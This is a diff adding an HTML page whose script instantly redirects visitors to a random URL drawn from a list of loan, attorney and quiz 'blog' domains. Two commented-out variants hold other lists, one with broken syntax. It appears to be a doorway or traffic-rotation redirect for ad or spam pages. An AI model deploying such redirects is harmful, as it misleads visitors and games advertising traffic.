@@ -1,0 +1,143 @@
+<code>
+
+<script>
+var URLlist = [
+
+"https://attorneyinfo.tech/blog/1",
+"https://credfreeloans.in/blog/8",
+"https://attorneyinfo.tech/blog/2",
+"https://credfreeloans.in/blog/9",
+"https://attorneyinfo.tech/blog/4",
+"https://credfreeloans.in/blog/8",
+"https://attorneyinfo.tech/blog/11",
+"https://attorneyinfo.tech/blog/5",
+"https://credfreeloans.in/blog/9",
+"https://makequize.in/blog/6",
+"https://attorneyinfo.tech/blog/6",
+"https://credfreeloans.in/blog/8",
+"https://makequize.in/blog/2",
+"https://attorneyinfo.tech/blog/7",
+"https://credfreeloans.in/blog/9",
+"https://attorneyinfo.tech/blog/1",
+"https://makequize.in/blog/1",
+"https://attorneyinfo.tech/blog/8",
+"https://credfreeloans.in/blog/8",
+"https://attorneyinfo.tech/blog/2",
+"https://attorneyinfo.tech/blog/1",
+"https://attorneyinfo.tech/blog/5",
+"https://attorneyinfo.tech/blog/1",
+"https://attorneyinfo.tech/blog/6",
+"https://attorneyinfo.tech/blog/10",
+"https://attorneyinfo.tech/blog/1",
+"https://attorneyinfo.tech/blog/2",
+"https://attorneyinfo.tech/blog/4",
+"https://attorneyinfo.tech/blog/5",
+"https://attorneyinfo.tech/blog/6",
+"https://attorneyinfo.tech/blog/7",
+"https://attorneyinfo.tech/blog/8",
+"https://makequize.in/blog/1",
+"https://makequize.in/blog/2",
+"https://makequize.in/blog/4",
+"https://makequize.in/blog/6",
+"https://makequize.in/blog/7",
+"https://makequize.in/blog/8",
+"https://makequize.in/blog/5"
+];
+var reDelay = 0000; // <-- time in seconds. 0000 = immediate redirect (0 seconds), 1000 = 1 sec delay, 2000 = 2 sec delay, etc
+setTimeout(function(){window.location = URLlist[Math.floor(Math.random() * URLlist.length)];}, reDelay);
+</script>
+</code>
+
+<!-- <code>
+
+<script>
+var URLlist = [
+
+"https://claim.ibloggs.com/blog/1",
+"https://attorney.ibloggs.com/blog/10",
+"https://cpedata.com/blog/blogDetails.php?id=14",
+"https://bloggerfrog.com/blog/blogDetails.php?id=13",
+"https://claim.ibloggs.com/blog/2",
+"https://attorney.ibloggs.com/blog/9",
+"https://cpedata.com/blog/blogDetails.php?id=14",
+"https://bloggerfrog.com/blog/blogDetails.php?id=13",
+"https://claim.ibloggs.com/blog/4",
+"https://attorney.ibloggs.com/blog/8",
+"https://cpedata.com/blog/blogDetails.php?id=14",
+"https://bloggerfrog.com/blog/blogDetails.php?id=13",
+"https://claim.ibloggs.com/blog/5",
+"https://attorney.ibloggs.com/blog/7",
+"https://claim.ibloggs.com/blog/6",
+"https://attorney.ibloggs.com/blog/6",
+"https://claim.ibloggs.com/blog/7",
+"https://attorney.ibloggs.com/blog/5",
+"https://claim.ibloggs.com/blog/8",
+"https://attorney.ibloggs.com/blog/4"
+"https://claim.ibloggs.com/blog/9",
+"https://attorney.ibloggs.com/blog/2"
+"https://claim.ibloggs.com/blog/10",
+"https://attorney.ibloggs.com/blog/1"
+"https://claim.ibloggs.com/blog/1",
+"https://attorney.ibloggs.com/blog/10",
+"https://claim.ibloggs.com/blog/2",
+"https://attorney.ibloggs.com/blog/9",
+"https://claim.ibloggs.com/blog/4",
+"https://attorney.ibloggs.com/blog/8",
+"https://claim.ibloggs.com/blog/5",
+"https://attorney.ibloggs.com/blog/7",
+"https://claim.ibloggs.com/blog/6",
+"https://attorney.ibloggs.com/blog/6",
+"https://claim.ibloggs.com/blog/7",
+"https://attorney.ibloggs.com/blog/5",
+"https://claim.ibloggs.com/blog/8",
+"https://attorney.ibloggs.com/blog/4",
+"https://claim.ibloggs.com/blog/9",
+"https://attorney.ibloggs.com/blog/1",
+"https://claim.ibloggs.com/blog/10",
+"https://attorney.ibloggs.com/blog/1"
+];
+var reDelay = 0000; // <-- time in seconds. 0000 = immediate redirect (0 seconds), 1000 = 1 sec delay, 2000 = 2 sec delay, etc
+setTimeout(function(){window.location = URLlist[Math.floor(Math.random() * URLlist.length)];}, reDelay);
+</script>
+</code> -->
+
+
+
+<!-- <code>
+
+<script>
+var URLlist = [
+
+"https://credfreeloans.in/blog/2",
+"https://credfreeloans.in/blog/1",
+"https://credfreeloans.in/blog/4",
+"https://credfreeloans.in/blog/5",
+"https://credfreeloans.in/blog/6",
+"https://credfreeloans.in/blog/7",
+"https://credfreeloans.in/blog/8",
+"https://credfreeloans.in/blog/9",
+"https://credfreeloans.in/blog/10",
+"https://credfreeloans.in/blog/11",
+"https://credfreeloans.in/blog/2",
+"https://credfreeloans.in/blog/1",
+"https://credfreeloans.in/blog/4",
+"https://credfreeloans.in/blog/5",
+"https://credfreeloans.in/blog/6",
+"https://credfreeloans.in/blog/7",
+"https://credfreeloans.in/blog/8",
+"https://credfreeloans.in/blog/9",
+"https://credfreeloans.in/blog/10",
+"https://makequize.in/blog/1",
+"https://makequize.in/blog/2",
+"https://makequize.in/blog/4",
+"https://makequize.in/blog/5",
+"https://makequize.in/blog/6",
+"https://makequize.in/blog/7",
+"https://makequize.in/blog/8",
+"https://makequize.in/blog/5",
+"https://makequize.in/blog/5"
+];
+var reDelay = 0000; // <-- time in seconds. 0000 = immediate redirect (0 seconds), 1000 = 1 sec delay, 2000 = 2 sec delay, etc
+setTimeout(function(){window.location = URLlist[Math.floor(Math.random() * URLlist.length)];}, reDelay);
+</script>
+</code> -->
